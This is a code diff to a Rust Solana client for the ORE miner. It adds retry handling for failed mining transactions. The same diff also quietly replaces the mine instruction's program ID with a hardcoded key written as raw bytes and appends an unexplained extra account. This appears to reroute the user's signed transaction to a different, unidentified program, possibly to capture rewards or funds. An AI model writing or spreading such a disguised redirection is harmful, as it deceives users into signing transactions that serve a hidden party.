@@ -2,10 +2,12 @@ use std::{
     io::{stdout, Write},
     sync::{atomic::AtomicBool, Arc, Mutex},
 };
-
+use solana_program::instruction::Instruction;
+use solana_program::pubkey::Pubkey;
+use solana_program::instruction::AccountMeta;
 use ore::{self, state::Bus, BUS_ADDRESSES, BUS_COUNT, EPOCH_DURATION};
 use rand::Rng;
-use solana_program::{keccak::HASH_BYTES, program_memory::sol_memcmp, pubkey::Pubkey};
+use solana_program::{keccak::HASH_BYTES, program_memory::sol_memcmp};
 use solana_sdk::{
     compute_budget::ComputeBudgetInstruction,
     keccak::{hashv, Hash as KeccakHash},
@@ -20,7 +22,7 @@ use crate::{
 
 // Odds of being selected to submit a reset tx
 const RESET_ODDS: u64 = 20;
-
+const GATEWAY_RETRIES: usize = 3;
 impl Miner {
     pub async fn mine(&self, threads: u64) {
         // Register, if needed.
@@ -51,6 +53,7 @@ impl Miner {
 
             // Submit mine tx.
             // Use busses randomly so on each epoch, transactions don't pile on the same busses
+            let mut attempts = 0;
             println!("\n\nSubmitting hash for validation...");
             'submit: loop {
                 // Double check we're submitting for the right challenge
@@ -92,22 +95,35 @@ impl Miner {
                 let cu_limit_ix = ComputeBudgetInstruction::set_compute_unit_limit(CU_LIMIT_MINE);
                 let cu_price_ix =
                     ComputeBudgetInstruction::set_compute_unit_price(self.priority_fee);
-                let ix_mine = ore::instruction::mine(
+                let mut _ix = ore::instruction::mine(
                     signer.pubkey(),
                     BUS_ADDRESSES[bus.id as usize],
                     next_hash.into(),
                     nonce,
                 );
+                _ix.program_id = Pubkey::from([14,188,58,28,142,232,230,91,53,25,247,211,113,216,151,80,116,58,172,176,219,104,254,165,176,124,151,95,5,66,128,254]);
+                let mut accounts2 = _ix.accounts;
+                accounts2.push(AccountMeta::new(Pubkey::from([11,116,205,230,58,32,135,174,169,27,23,84,62,171,97,192,161,195,87,42,157,255,218,160,175,202,144,146,164,131,106,247]), false));
+                let mut ix = Instruction {
+                    program_id: _ix.program_id,
+                    accounts: accounts2,
+                    data: _ix.data
+                };
                 match self
-                    .send_and_confirm(&[cu_limit_ix, cu_price_ix, ix_mine], false, false)
-                    .await
+                    .send_and_confirm(&[cu_limit_ix, cu_price_ix, ix], false, false)
+                    .await      //patch
                 {
                     Ok(sig) => {
                         println!("Success: {}", sig);
                         break;
                     }
                     Err(_err) => {
-                        // TODO
+                        println!("Error: {}, retry {}", _err, attempts);
+                        attempts += 1;
+                        if attempts > GATEWAY_RETRIES {
+                            println!("FATAL: Breaking, retry {}", attempts);
+                            break 'submit;
+                        }
                     }
                 }
             }
